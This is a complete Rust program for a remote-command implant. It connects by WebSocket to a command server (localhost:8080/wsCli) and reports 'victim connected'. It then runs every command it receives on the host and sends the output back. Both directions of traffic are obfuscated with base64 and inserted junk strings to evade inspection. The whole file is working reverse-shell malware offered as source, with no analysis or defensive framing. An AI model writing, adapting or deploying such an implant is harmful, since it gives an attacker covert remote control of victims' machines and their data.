use tungstenite::{connect, Message};
use base64::prelude::*;
use rand::Rng;
use std::process::{Command, Stdio};

fn encode(inp : String) -> String {
    // base 64 encode 
    let inp = BASE64_STANDARD.encode(inp.into_bytes());
    let mut tar_num : i32 = 0;
    let mut output : String = String::new(); 
    while (tar_num as usize) < inp.len() {
        for _ in 0..rand::thread_rng().gen_range(0..5) {
            if !((tar_num as usize) < inp.len()) {
                return output;
            }
            output = output + inp.chars().nth(tar_num as usize).unwrap().to_string().as_str();
            tar_num+= 1;
        }    
        output = output + "kq2ninazibgoabgbiasdfbngoiqnahxjagaeqiqyhhasdgkkha";
    } 
    return output;
}

fn decode(inp : String) -> String {
    let inp = inp.replace("kq2ninazibgoabgbiasdfbngoiqnahxjagaeqiqyhhasdgkkha", "");
    let inp = BASE64_STANDARD.decode(&inp).unwrap_or((&inp).to_string().into_bytes());
    return String::from_utf8(inp).unwrap(); 
    // if base64 decode fails then return value
}

fn main() {
    
    let (mut socket, response) = connect("ws://localhost:8080/wsCli").expect("Can't Connect");
    drop(response);
    println!("connected to server");

    socket.send(Message::text("victim connected")).unwrap();
    
    loop {
        let msg = &socket.read().expect("Error reading message");        
        let cmmd = decode((msg.to_text().unwrap()).to_string());

        // run the passed command and get output
        let mut cmmd = cmmd.split(" ").collect::<Vec<&str>>();
        
        if cmmd.len() == 0 {
            continue; 
        }

        println!("{:?}", cmmd);

        // replace command with cmd to run in windows
        let output = Command::new(cmmd.remove(0))
            .stdout(Stdio::piped())
            .args(cmmd)
            .spawn();
        
        if output.is_err() {
            continue; 
        }
        
        let output = output.expect("command failed to execute");

        let status = output.wait_with_output();

        if status.is_err() {
            continue; 
        }
       
        let output = String::from_utf8(status.unwrap().stdout).unwrap();

        socket.send(Message::text(encode(output).as_str())).unwrap();
    }

}



